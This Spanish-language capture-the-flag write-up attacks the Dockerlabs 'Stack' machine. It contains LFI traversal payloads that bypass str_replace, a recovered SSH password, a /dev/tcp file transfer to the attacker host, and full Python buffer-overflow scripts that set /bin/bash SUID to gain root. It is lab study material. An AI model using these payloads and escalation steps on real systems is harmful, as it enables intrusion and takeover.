
# Writeup Template: Maquina `[Stack]`

- Tags: #Stack #RaceCondition #DesbordamientoBuffer
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Stack](https://mega.nz/file/OBFRQKaa#sp_n4F-7ffNhdWReBuYnsQUkBQOjHtcjDgon7E-ZHSc)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x stack.zip
sudo bash auto_deploy.sh stack.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```

Revisando el codigo fuente vemos un comentario **html** para un usuario:
```bash
<!--Mensaje para Bob: hemos guardado tu contrase�a en /usr/share/bob/password.txt-->
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 417]
/file.php             (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/note.txt             (Status: 200) [Size: 110]
```

Mirando esta ruta:
```bash
http://172.17.0.2/note.txt
```

Vemos el siguiente mensaje:
```bash
Hemos detectado el LFI en el archivo PHP, pero gracias a str_replace() creemos haber tapado la vulnerabilidad
```

Asi que tenemos una via potencial de explotar un **LFI** pero tenemos que detectar que archivo es vulnerable a un **LFI**
Con este no encontramos nada, Sabiendo que estan aplicando **( str_replace() )** Sabemos que no es seguro: 
```bash
wfuzz -c --hl=9 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://172.17.0.2/file.php\?FUZZ\=whaomi"
```

**( str_replace() )** -> Permite sustituir cadenas, indicamos que donde encuentre una coincidencia: **(../)*** lo sustituya por cadenas vacias, para al final recibir solo este output: **( /etc/host )**
Sabiendo esto tenemos algunas maneras de romper esa validadcion:
```bash
../../../../etc/passwd
....//....//....//....//etc/passwd
....//....//....//....//etc//passwd
```

Probrando cada una de estas:
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/file.php?FUZZ=....//....//....//....//etc//passwd" --hl=0
```

Tenemos el parametro, Y ahora verificaremos si es vulnerable:
```bash
000000759:   200        20 L     22 W       922 Ch      "file"                                                                                                                                                                                                      
```

Realizamos el ataque:
```bash
wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.17.0.2/file.php?file=FUZZ" --hl=0
```

Tenemos todos estas formas de aplicar un **LFI**:
```bash
"....//....//....//....//....//etc/passwd"                                                                                                      
"....//....//....//....//....//....//....//etc/passwd"                                                                                          
"....//....//....//....//....//....//etc/passwd"                                                                                                
"....//....//....//....//....//....//....//....//etc/passwd"                                                                                    
"....//....//....//....//....//....//....//....//....//etc/passwd"                                                                              
"....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                            
"....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                      
"....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                                  
"....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                
"....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                                        
"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                          
"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                              
"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                    
"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                        
"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                  
"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"
"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"      
"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"            
"....//....//....//....//etc/passwd"                                                                                                            
"....//....//....//etc/passwd"                                                                                                                  
```
### Credenciales Encontradas
**Nota** Ya sabemos que en codigo fuente existe un comentario **html** que nos indica donde esta almacenada la contrasena del usuario: **( bob )** asi que apuntamos a esa ruta:
```bash
http://172.17.0.2/file.php?file=....//....//....//usr/share/bob/password.txt
```

Tenemos la contrasena:
```bash
llv6ox3lx300
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora sabiendo esto nos conectaremos con este usuario por **ssh**:
### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh bob@172.17.0.2 # ( llv6ox3lx300 )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"
```

**Hallazgos Clave:**
Revisando los usarios del sistema, al parecer solo tenemos dos
```bash
root:x:0:0:root:/root:/bin/bash
bob:x:1000:1000::/home/bob:/bin/bash
```

### Explotacion de Privilegios

###### Usuario `[ bob ]`:
Listando binarios con privilegios **SUID**
```bash
find / -perm -4000 2>/dev/null
```

Tenemos el siguiente:
```bash
/opt/command_exec
```

Y revisando sus permisos detectamos que es **SUID** y que pertenece a **root**
```bash
-rwsr-xr-x 1 root root 16328 Dec 19 10:22 /opt/command_exec
```

Ahora nos aprovechamos de este para ejecutarlo y ganar una bash como **root**
Al intentar ejecutarlo nos pide una contrasena:
```bash
/opt/command_exec
```

Nos trasladaremos este binario a nuestra maquina de atacante para realizar pruebas:
Primero nos ponemos en escucha desde nuestra maquina atacante:
```bash
nc -nlvp 443 > command_exec
```

Ahora desde la maquina victima nos enviaremos el binario:
```bash
cat command_exec > /dev/tcp/172.17.0.1/443
```

Ahora teniendo el bianrio en nuestra maquina de atacante y sabiendo que necesitamos una contrasena empezaremos a realizar pruebas:
Vemos que es un bianrio ejecutable:
```bash
file command_exec
command_exec: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dd01c803bbdd48675e24dc6e347b219ab5ccc771, for GNU/Linux 3.2.0, not stripped
```

realizamos el comandos: **( strings )** para ver las lineas legibles del binario y entre ellas tenemos:
```bash
strings command_exec
```

Tiene: **( 0xdead )** esto significa su poscicion en la memoria, Lo que nos lleva a pensar en un posible **BufferOverflow**: conocido como **desboradmiendoBuffer**
```bas
key debe valer 0xdead para entrar al modo administrador
```

Sabemos que si tiene un limite de memeoria establecido y lo sobrepasamos entonces podriamos intentar realizar el **BufferOverflow** de la siguiente manera:
```bash
python3 -c 'print("A"*200)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Le damos permisos de ejecucion al binario y despues probamos inyectar las **200** letras para ver como reacciona el binario:
```bash
./command_exec
Escribe la contraseña: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Tenemos la siguiente respuesta:
```bash
zsh: segmentation fault  ./command_exec
```

1. **Buffer Overflow**: Al ingresar una contraseña extremadamente larga (244 caracteres 'A'), se desborda el búfer, sobrescribiendo la variable `key` con `0x41414141` (hexadecimal de 'AAAA').
2. **Requisito de Administrador**: El programa requiere que `key` sea `0xdead` (57005 en decimal) para acceder al modo administrador.
3. **Segmentation Fault**: El desbordamiento adicional corrompe la pila, causando un fallo de segmentación.

Ejecutamos el siguiente comando para el analizis del binario:
```bash
checksec --file=command_exec

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   44 Symbols        No    0               3               command_exec
```

#### 1. **RELRO (Relocation Read-Only)**
- **Partial RELRO**:
    - **La sección GOT (Global Offset Table) es modificable**.
    - **Vulnerabilidad**: Permite ataques **GOT overwrite** (un atacante puede redirigir llamadas a funciones como `strcpy` o `printf` a código malicioso).
    - _Ejemplo_: Si controlas un desbordamiento de búfer, puedes sobrescribir `printf@GOT` para que apunte a `system` y ejecutar comandos
#### 2. **Stack Canary**
- **No canary found**:
    - **No hay protección contra buffer overflows en la pila (stack)**.
    - **Vulnerabilidad crítica**: Permite **desbordamientos de búfer (stack smashing)** sin detección.    
    - _En tu caso_: El segmentation fault ocurrió porque pudiste sobrescribir la dirección de retorno (gracias a la ausencia de canary).
#### 3. **NX (No-eXecute)**
- **NX enabled**:
    - **La pila (stack) no es ejecutable**.
    - **Implicaciones**:
        - No se puede ejecutar _shellcode_ inyectado en la pila.
        - _Alternativas de ataque_: Deberás usar técnicas como **Return-Oriented Programming (ROP)** o modificar datos críticos (como hiciste con `key`).
#### 4. **PIE (Position Independent Executable)**
- **PIE enabled**:
    - **Las direcciones de memoria del binario son aleatorizadas** (ASLR en el código).
    - **Implicaciones**:
        - Las direcciones de funciones/variables cambian en cada ejecución.
        - _Dificulta_: Ataques que requieren direcciones fijas (e.g., saltar a `main()` o usar gadgets ROP).
        - _En tu caso_: El exploit debe ser independiente de direcciones o requerir filtraciones de memoria.
#### 5. **FORTIFY Source**
- **FORTIFY desactivado** (`No` y `0 Fortified`):
    - **No se verifican los usos peligrosos de funciones como `memcpy` o `printf`**.
    - **Riesgo**: Permite desbordamientos en funciones vulnerables sin detección.
    - _Ejemplo_: Un `char buffer[64]` con `strcpy(buffer, input)` no verifica límites.
#### 6. **RPATH/RUNPATH**
- **Ausentes** (`No RPATH`, `No RUNPATH`):
    - No hay rutas inseguras para carga de librerías.
    - _Positivo_: Elimina ataques como **hijacking de librerías**.
#### 7. **Símbolos**
- **44 Symbols**:
    - Los nombres de funciones/variables están incluidos.
    - _Facilita_: Ingeniería inversa y depuración (no afecta la explotación).

## Ingenieria Inversa [ BufferOverFlow ]
Clonamos este repo para realizar el **bufferOverFlow** intalamos el siguiente repo
```bash
sudo git clone https://github.com/pwndbg/pwndbg
```

```bash
cd pwndbg
```

```bash
sudo ./setup.sh
```

Una ves intalado todo, Lo ejecutamos y veremos lo siguiente:
```bash
gdb ./command_exec

GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./command_exec...
(No debugging symbols found in ./command_exec)
(gdb)
```

En mi maquina de atacante generare una cadena para intentar desbodar, y nos ayudamos de la siguiente herramienta:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
```

Esto nos genera esta cadena:
```bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Desde el: **( gdb )** realizaremos el comando **run** para que se ejecute:
```bash
run
```

Cuando nos pida en el **input** la contrasena le inyectamos los caracteres y despues le damos enter:
```bash
Escribe la contraseña: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Nos indica que tenemos una **Segmentacion**
```bash
Estás en modo usuario (key = 63413563)
key debe valer 0xdead para entrar al modo administrador

Program received signal SIGSEGV, Segmentation fault.
0x0000555555555288 in main ()
```

Despues mostramos la info y vemos lo siguiente:
```bash
(gdb) info frame

Stack level 0, frame at 0x7fffffffdc70:
 rip = 0x555555555288 in main; saved rip = 0x3164413064413963
 Arglist at 0x4138634137634136, args: 
 Locals at 0x4138634137634136, Previous frame's sp is 0x7fffffffdc70
 Saved registers:
  rbp at 0x7fffffffdc60, rip at 0x7fffffffdc68
```

Ya teniendo el valor del **RIP**:
```bash
rip = 0x3164413064413963
```

Esta valor lo usaremos para el calculo del **offset** de la siguiente manera:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x3164413064413963

[*] Exact match at offset 88 # Resultado
```

## Automatizacion con Python
**Nota** Para resolver el **bufferOverFlow** he usado la documentacion de: [dise0](https://dise0.gitbook.io/h4cker_b00k) en la cual hago uso de sus scripts en python para ayudarme con la auditoria ya que mis conocimientos en **BufferOverFlow** son minimos:
El objetivo es obtener el valor de stack: **( 0x3164413064413963 )** que es el que debemos sobreescribir
Usaremos el script de **dise0** para automatizar la creacion de caracteres: **( overflowCreate.py )**
```python
import argparse

def generate_pattern(buffer_length, offset_length=0, rest_length=0):
    """
    Genera una cadena en la que:
    - Los caracteres del buffer se rellenan con 'A'.
    - El segmento del offset se llena con 'B'.
    - El resto se llena con 'C'.
    
    Args:
        buffer_length (int): Longitud del segmento del buffer (relleno con 'A').
        offset_length (int): Longitud del segmento del offset (relleno con 'B').
        rest_length (int): Longitud del segmento del resto (relleno con 'C').
        
    Returns:
        str: Cadena generada.
    """
    buffer_segment = 'A' * buffer_length
    offset_segment = 'B' * offset_length
    rest_segment = 'C' * rest_length
    return buffer_segment + offset_segment + rest_segment

def main():
    parser = argparse.ArgumentParser(description="Generador de patrones para buffer overflow.")
    parser.add_argument('-b', '--buffer', type=int, required=True, help="Tamaño del segmento para desbordar el buffer (relleno con 'A').")
    parser.add_argument('-o', '--offset', type=int, default=0, help="Tamaño del segmento del offset (relleno con 'B').")
    parser.add_argument('-p', '--padding', type=int, default=0, help="Tamaño del segmento restante (relleno con 'C').")
    
    args = parser.parse_args()
    
    # Validar que `-o` y `-p` dependen de `-b`
    if args.offset and not args.buffer:
        print("Error: El argumento '-o' depende de '-b'. Usa '-b' para especificar el buffer primero.")
        return
    if args.padding and not (args.buffer and args.offset):
        print("Error: El argumento '-p' depende de '-b' y '-o'. Usa ambos antes de '-p'.")
        return
    
    # Generar patrón
    pattern = generate_pattern(args.buffer, args.offset, args.padding)
    print("\n=== Patrón Generado ===")
    print(pattern)

if __name__ == "__main__":
    main()
```

Una ves creado en la documentacion nos indica como generar los caracteres:
```bash
python3 overflowCreate.py -b 88 -o 4
```

Nos retorna este patron:
```bash
=== Patrón Generado ===
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

Esta cadena la tenemos que inyectar en el campo donde nos pide la contrasena:
```bash
run
```

Asi lo inyectamos:
```bash
Escribe la contraseña: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

Tenemos este resultado:
```bash
Estás en modo usuario (key = 41414141)
key debe valer 0xdead para entrar al modo administrador

Program received signal SIGSEGV, Segmentation fault.
0x00007f0042424242 in ?? ()
```

Como indica en la documentacion estamos sobreescribiendo el **RIP** con los caracteres: **B** que estan representados en **hexadecimal** con el **( 0x00007f0042424242 )** y las **A** con el **( key = 41414141 )** asi que se esta sobreescribiendo correctamente:
```bash
Program received signal SIGSEGV, Segmentation fault.
0x00007f0042424242 in ?? ()
```

En la documentacion nos indica como seria de forma manual detectar donde se sobreescribe: **( B(42) )** y la **key** que indica el binario:
```bash
python2 -c 'print b"A"*76 + b"B"*8' | ./command_exec
```

Resultado:
La **key** se sobreescribe con **b(42)** despues de los **76** caracteres, Indicando que el valor real del **offset** 
```bash
Escribe la contraseña: Estás en modo usuario (key = 42424242)
key debe valer 0xdead para entrar al modo administrador
```

## Automatizacion: `dead`
En la documentacion indica que la direccion de memoria es: **( 0xdead )** que es la que sobreescribe a la **key** 
Para ello usaremos otro script que nos automatize eso y lo llamaremos: **( exploit.py )**
**Nota** En la variable: **program** colocamos la ruta exacta en donde tenemos el binario.
```python
#!/bin/python3

import subprocess

# 1. Offset para alcanzar la ubicación de la variable 'key' en la pila
# Este valor debe ser ajustado para coincidir con la cantidad de bytes que debemos sobrescribir
# antes de llegar a la variable 'key' o la dirección que queremos manipular.
offset = 76

# 2. Crear la parte del RIP (Return Instruction Pointer), utilizando 'A' para llenar la memoria.
# El RIP es el puntero de retorno en la pila, que en el caso de un desbordamiento de buffer puede
# sobrescribirse, permitiéndonos manipular la ejecución del programa.
# En este caso, 'A' es solo un carácter de relleno para alcanzar el valor deseado.
RIP = b"A" * offset

# 3. Representación de 0xdead en dos bytes: 0xad y 0xde.
# Queremos sobrescribir la variable 'key' con el valor 0xdead. Este valor se representa en hexadecimal
# como dos bytes: 0xad (más bajo) y 0xde (más alto).
dead = b"\xad\xde"

# 4. Crear el payload final, que consiste en:
# - RIP: Llenamos con 'A' hasta llegar a la posición de la variable 'key'
# - dead: Sobrescribimos 'key' con 0xdead
payload = RIP + dead

# 5. Nombre del binario que vamos a ejecutar
# En este caso, es un binario llamado 'command_exec' que se encuentra en el directorio /opt y lo ejecuta directamente
program = ["Ruta_Binario"]

# 6. Ejecutar el binario con un proceso hijo utilizando Popen.
# Utilizamos stdin=subprocess.PIPE para poder enviar datos (el payload) al binario de forma controlada.
process = subprocess.Popen(
    program, stdin=subprocess.PIPE
)

# 7. Enviar el payload al programa a través de stdin.
# El primer payload sobrescribe la ubicación de la 'key' con el valor 0xdead.
process.stdin.write(payload + b"\n")
process.stdin.flush()  # Aseguramos que el payload se envíe correctamente.

# 8. Esperamos a que termine el proceso.
# Esto asegura que el binario termine su ejecución antes de finalizar el script.
process.wait()
```

Lo ejecutamos:
```bash
python3 exploit.py
```

Nos retorna lo siguiente:
```bash
Escribe la contraseña: Estás en modo administrador (key = dead)
Escribe un comando:
```

En la documentacion usaremos otro exploit en python que nos permite automatizar el envio de comandos **( commandExploit.py )**:
**Nota** En la variable: **program** colocamos la ruta exacta en donde tenemos el binario.
```bash
#!/bin/python3

import subprocess

# 1. Offset para alcanzar la ubicación de la variable 'key' en la pila
# Este valor debe ser ajustado para coincidir con la cantidad de bytes que debemos sobrescribir
# antes de llegar a la variable 'key' o la dirección que queremos manipular.
offset = 76

# 2. Crear la parte del RIP (Return Instruction Pointer), utilizando 'A' para llenar la memoria.
# El RIP es el puntero de retorno en la pila, que en el caso de un desbordamiento de buffer puede
# sobrescribirse, permitiéndonos manipular la ejecución del programa.
# En este caso, 'A' es solo un carácter de relleno para alcanzar el valor deseado.
RIP = b"A" * offset

# 3. Representación de 0xdead en dos bytes: 0xad y 0xde.
# Queremos sobrescribir la variable 'key' con el valor 0xdead. Este valor se representa en hexadecimal
# como dos bytes: 0xad (más bajo) y 0xde (más alto).
dead = b"\xad\xde"

# 4. Comando adicional que se ejecutará al sobrescribir la 'key'.
# El comando 'id' para ver que usuario somos o bajo el que se esta ejecutando
command = b"id"

# 5. Crear el payload final, que consiste en:
# - RIP: Llenamos con 'A' hasta llegar a la posición de la variable 'key'
# - dead: Sobrescribimos 'key' con 0xdead
payload = RIP + dead

# 6. Nombre del binario que vamos a ejecutar
# En este caso, es un binario llamado 'command_exec' que se encuentra en el directorio /opt y lo ejecuta directamente
program = ["Ruta_binario"]

# 7. Ejecutar el binario con un proceso hijo utilizando Popen.
# Utilizamos stdin=subprocess.PIPE para poder enviar datos (el payload) al binario de forma controlada.
process = subprocess.Popen(
    program, stdin=subprocess.PIPE
)

# 8. Enviar el payload al programa a través de stdin.
# El primer payload sobrescribe la ubicación de la 'key' con el valor 0xdead.
process.stdin.write(payload + b"\n")
process.stdin.flush()  # Aseguramos que el payload se envíe correctamente.

# 9. Ahora que hemos sobrescrito la 'key', enviamos el comando adicional que se ejecutará,
# en este caso, 'id' para ver que usuario somos o bajo el que se esta ejecutando
process.stdin.write(command + b"\n")
process.stdin.flush()

# 10. Esperamos a que termine el proceso.
# Esto asegura que el binario termine su ejecución antes de finalizar el script.
process.wait()
```

Ejecutamos el exploit:
```bash
python3 commandExploit.py
```

Funciona correctamente:
**Nota** todas estas pruebas fueron primero en mi maquina atacante para maximizar el proceso:
```bash
Escribe la contraseña: Estás en modo administrador (key = dead)
Escribe un comando: uid=1000(nate) gid=1000(nate) grupos=1000(nate)
```

## Explotacion del binario:
Usaremos el siguiente **script** para elevar privilegios de **root** en la maquina victama ya que en la maquina victima tiene permisos **SUID**:
Usamos este exploit: **( rootExploit.py )** ya en la maquina victima:
```python
#!/bin/python3

import subprocess

# 1. Offset para alcanzar la ubicación de la variable 'key' en la pila
# Este valor debe ser ajustado para coincidir con la cantidad de bytes que debemos sobrescribir
# antes de llegar a la variable 'key' o la dirección que queremos manipular.
offset = 76

# 2. Crear la parte del RIP (Return Instruction Pointer), utilizando 'A' para llenar la memoria.
# El RIP es el puntero de retorno en la pila, que en el caso de un desbordamiento de buffer puede
# sobrescribirse, permitiéndonos manipular la ejecución del programa.
# En este caso, 'A' es solo un carácter de relleno para alcanzar el valor deseado.
RIP = b"A" * offset

# 3. Representación de 0xdead en dos bytes: 0xad y 0xde.
# Queremos sobrescribir la variable 'key' con el valor 0xdead. Este valor se representa en hexadecimal
# como dos bytes: 0xad (más bajo) y 0xde (más alto).
dead = b"\xad\xde"

# 4. Comando adicional que se ejecutará al sobrescribir la 'key'.
# El comando 'chmod u+s /bin/bash' cambia los permisos de 'bash' para permitir que sea ejecutado
# con privilegios de usuario 'root' (SUID).
# Esto puede ser utilizado para obtener acceso de root al ejecutar el binario modificado.
command = b"chmod u+s /bin/bash"

# 5. Crear el payload final, que consiste en:
# - RIP: Llenamos con 'A' hasta llegar a la posición de la variable 'key'
# - dead: Sobrescribimos 'key' con 0xdead
payload = RIP + dead

# 6. Nombre del binario que vamos a ejecutar
# En este caso, es un binario llamado 'command_exec' que se encuentra en el directorio /opt y lo ejecuta directamente
program = ["/opt/command_exec"]

# 7. Ejecutar el binario con un proceso hijo utilizando Popen.
# Utilizamos stdin=subprocess.PIPE para poder enviar datos (el payload) al binario de forma controlada.
process = subprocess.Popen(
    program, stdin=subprocess.PIPE
)

# 8. Enviar el payload al programa a través de stdin.
# El primer payload sobrescribe la ubicación de la 'key' con el valor 0xdead.
process.stdin.write(payload + b"\n")
process.stdin.flush()  # Aseguramos que el payload se envíe correctamente.

# 9. Ahora que hemos sobrescrito la 'key', enviamos el comando adicional que se ejecutará,
# en este caso, 'chmod u+s /bin/bash' para cambiar los permisos de bash y permitir ejecutar bash como root.
process.stdin.write(command + b"\n")
process.stdin.flush()

# 10. Esperamos a que termine el proceso.
# Esto asegura que el binario termine su ejecución antes de finalizar el script.
process.wait()
```

Ya estando listo el exploit en la maquina victima procedemos a ejecutarlo:
```bash
python3 rootExploit.py 

Escribe la contraseña: Estás en modo administrador (key = dead)
Escribe un comando:
```

Si todo salio bien ahora la **bash** tendra permisos **SUID** lo que nos permitira migrar a root:
Hemos logrado con exito:
```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

Explotamos el binario
```bash
# Comando para escalar al usuario: ( root )
 bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.2# whoami                                                                                                                                                                                                                                                              
root
```

---

## Lecciones Aprendidas
1. Aprendimos a explotar un **LFI**
2. Aprendimos como es un **BufferOverFlow**
3. Aprendimos a realizar un ataque de **BufferOverFlow**